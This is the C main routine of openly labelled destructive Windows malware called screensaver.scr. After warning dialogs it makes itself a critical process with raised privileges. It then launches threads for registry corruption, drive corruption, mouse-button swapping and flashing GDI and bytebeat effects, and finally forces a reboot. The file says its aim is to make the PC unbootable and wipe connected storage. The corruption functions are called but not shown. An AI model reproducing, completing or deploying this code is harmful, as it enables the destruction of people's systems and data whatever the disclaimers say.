#include "screensaver.h"

HINSTANCE g_hInstance = NULL;

BOOL g_bIsVistaOr7 = FALSE;
BOOL g_bIs102004OrNewer = FALSE;

BOOL g_bBlocked = FALSE;
BOOL g_bSafeMode = FALSE;
BOOL g_bLayeredGdiCompatible = TRUE;

INT WINAPI wWinMain(
    __in HINSTANCE hInstance,
    __in_opt HINSTANCE hPrevInstance,
    __in LPWSTR lpCmdLine,
    __in int nShowCmd
)
{
	g_hInstance = hInstance;
	Xorshift32_Seed((DWORD)__rdtsc());

	CreateMutexW(NULL, TRUE, L"screensaver.scr");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		return 0;

	ReadRegistry();

	if (g_bBlocked)
		return MessageBoxW(NULL, L"Execution blocked by registry! Screeensaver will not continue.", L"screensaver.scr - ERROR", MB_ICONERROR);

	BOOL bWow64;
	IsWow64Process(GetCurrentProcess(), &bWow64);

	if (bWow64)
	{
		return MessageBoxW(NULL,
			L"The 32-bit screensaver version was incorrectly extracted on a 64-bit Windows version.\nThis will prevent screensaver from running properly, and therefore will not run.",
			L"screensaver.scr - ERROR", MB_ICONERROR);
	}

	while (!Dropper());

	InitializeBytebeats();

	if (!IsCompatibleWindowsVersion())
	{
		g_bLayeredGdiCompatible = FALSE;

		MessageBoxW(NULL,
			L"Your Windows version is incompatible with layered window GDI, so screensaver will run without it.\n"
			L"To run screensaver with layered window GDI, run it on Windows XP - 7, or Windows 10 2004+.",
			L"screensaver.exe", MB_ICONINFORMATION);
	}

	if (g_bSafeMode)
	{
		if (MessageBoxW(NULL,
			L"The program you've just executed is considered malware.\n"
			L"However, Safe Mode is enabled, so no harmful code will be executed.\n\n"

			L"Please keep in mind that all the harmful code, though not executed, is still in the program's binary, so just in case, a virtual machine is still recommended.\n"
			L"Additionally, this program still contains flashling lights and disturbing noises, so if you're photosensitive then press \"No\" and exit the program now.\n\n"

			L"Are you absolutely sure you want to continue? This is the only warning!",

			L"[SAFE MODE] screensaver.scr - !!! WARNING !!!", MB_ICONQUESTION | MB_YESNO | MB_SYSTEMMODAL | MB_DEFBUTTON2) != IDYES) return 0;
	}
	else
	{
		if (MessageBoxW(NULL,
			L"!!! WARNING !!!\n\n"
		
			L"The program you've just executed is considered malware.\n"
			L"This malware has the destructive capabilities to permamently damage Windows and all data stored on all connected storage!\n\n"
		
			L"However, no destruction has happened yet, so you can still click \"No\" and the program will peacefully exit.\n"
			L"This malware was made for educational and entertainment purposes only, and must be ran on a snapshotted virtual machine with no important data stored on it!\n\n"
			
			L"If you continue, all your data will be permamently lost. Are you sure you want to continue?",
			
			L"screensaver.scr - !!! WARNING !!!", MB_ICONWARNING | MB_YESNO | MB_SYSTEMMODAL | MB_DEFBUTTON2) != IDYES) return 0;

		if (MessageBoxW(NULL,
			L"!!! FINAL WARNING !!!\n\n"
			
			L"This is your final chance to stop this malware from executing. Clicking \"Yes\" on this message box will immediately launch all destructive payloads.\n"
			L"By continuing, you agree that you're running this on a safe, isolated environment and that you understand that this malware will corrupt the contents of all connected storage and make your PC unbootable!\n\n"
			
			L"Also, this malware contains a lot of heavy flashling lights and disturbing noises that play immediately after clicking \"Yes\", so if you're photosensitive, click \"No\" and do not run this malware at all!\n"
			L"The creator of this malware, Silverjetes, is not responsible for any damage caused by the misuse of this malware!\n\n"
			
			L"You have been warned. Are you ABSOLUTELY sure you want to continue?",

			L"screensaver.scr - !!! FINAL WARNING !!!", MB_ICONWARNING | MB_YESNO | MB_SYSTEMMODAL | MB_DEFBUTTON2) != IDYES) return 0;
	}

	if (!g_bSafeMode)
	{
		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);

		if (!AdjustPrivileges())
			MessageBoxW(NULL, L"I failed to adjust my privileges and I blame you for that", L"screensaver.scr - ERROR", MB_ICONERROR | MB_SYSTEMMODAL);

		if (!SetAsCritical())
			MessageBoxW(NULL, L"I failed to set myself as a critical process and I also blame you for that", L"screensaver.scr - ERROR", MB_ICONERROR | MB_SYSTEMMODAL);

		CloseHandle(QuickCreateThread(RegistryCorruptionThread, NULL));
		CloseHandle(QuickCreateThread(DriveCorruptionThread, NULL));

		CloseHandle(QuickCreateThread(WindowPayloadThread, NULL));
		CloseHandle(QuickCreateThread(MouseButtonSwappingThread, NULL));
	}

	if (g_bIsVistaOr7 && !DisableDWM()) g_bLayeredGdiCompatible = FALSE;

	CloseHandle(QuickCreateThread(BytebeatThread, NULL));

	CloseHandle(QuickCreateThread(GdiOverlayWindowThread, NULL));
	WaitForSingleObject(QuickCreateThread(GdiThread, NULL), _min_ms(5));

	for (;;)
	{
		if (g_bSafeMode) break;
		if (!Reboot()) MessageBoxW(NULL, L"Please be kind enough to reboot your computer yourself, because for some reason, I can't", L"screensaver.scr - ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
	}

	hInstance; hPrevInstance; lpCmdLine; nShowCmd;
	return 0;
};